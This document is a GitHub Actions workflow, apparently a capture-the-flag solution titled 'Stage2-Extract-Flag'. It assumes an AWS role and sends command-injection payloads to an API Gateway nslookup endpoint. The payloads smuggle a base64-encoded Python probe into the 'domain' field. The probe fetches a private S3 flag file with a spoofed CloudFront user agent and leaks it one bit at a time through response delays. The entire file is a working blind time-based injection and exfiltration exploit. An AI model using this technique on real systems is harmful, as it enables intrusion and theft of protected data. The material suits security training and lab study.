name: Stage2-Extract-Flag

on:
  workflow_dispatch:

permissions:
  id-token: write
  contents: read

jobs:
  extract:
    runs-on: ubuntu-latest

    steps:
      - name: Configure AWS
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
          aws-region: us-east-1

      - name: Extract flag
        shell: bash
        run: |
          set +e
          python3 -m pip install boto3 requests requests-aws4auth --quiet

          python3 - <<'PY'
          import base64
          import shlex
          import time
          import requests
          import boto3
          from requests_aws4auth import AWS4Auth

          API = "https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup"
          S3_URL = "https://s3.us-east-1.amazonaws.com/userad88e2b168aa387e/flag.txt"
          USER_AGENT = "Amazon CloudFront"
          MAX_LENGTH = 96
          SLEEP_SECONDS = 2.0
          THRESHOLD = 1.0

          inner = r'''
          import sys
          import time
          import urllib.request

          url = sys.argv[1]
          ua = sys.argv[2]
          index = int(sys.argv[3])
          bit = int(sys.argv[4])

          request = urllib.request.Request(
              url,
              headers={"User-Agent": ua}
          )

          with urllib.request.urlopen(request, timeout=10) as response:
              data = response.read()

          if index < len(data) and (data[index] & (1 << bit)):
              time.sleep(2.0)
          '''

          encoded = base64.b64encode(inner.encode()).decode()

          credentials = boto3.Session().get_credentials().get_frozen_credentials()

          auth = AWS4Auth(
              credentials.access_key,
              credentials.secret_key,
              "us-east-1",
              "execute-api",
              session_token=credentials.token
          )

          recovered = bytearray()

          for index in range(MAX_LENGTH):
              value = 0

              for bit in range(8):
                  command = (
                      "printf '%s' "
                      + shlex.quote(encoded)
                      + " | base64 -d > /tmp/bit_probe.py; "
                      + "python3 /tmp/bit_probe.py "
                      + shlex.quote(S3_URL)
                      + " "
                      + shlex.quote(USER_AGENT)
                      + " "
                      + str(index)
                      + " "
                      + str(bit)
                      + "; #"
                  )

                  started = time.monotonic()

                  try:
                      requests.post(
                          API,
                          json={"domain": command},
                          auth=auth,
                          timeout=20
                      )
                  except Exception as error:
                      print("REQUEST_ERROR", index, bit, repr(error))

                  elapsed = time.monotonic() - started

                  if elapsed > THRESHOLD:
                      value |= 1 << bit

                  print(
                      "INDEX=%d BIT=%d VALUE=%d ELAPSED=%.2f"
                      % (index, bit, value, elapsed),
                      flush=True
                  )

                  time.sleep(0.05)

              if value == 0:
                  break

              recovered.append(value)
              print(
                  "CHAR[%d]=%r BYTE=%d"
                  % (index, chr(value), value),
                  flush=True
              )

          print("FLAG_BYTES=", bytes(recovered))
          print("FLAG_TEXT=", bytes(recovered).decode("utf-8", errors="replace"))
          PY
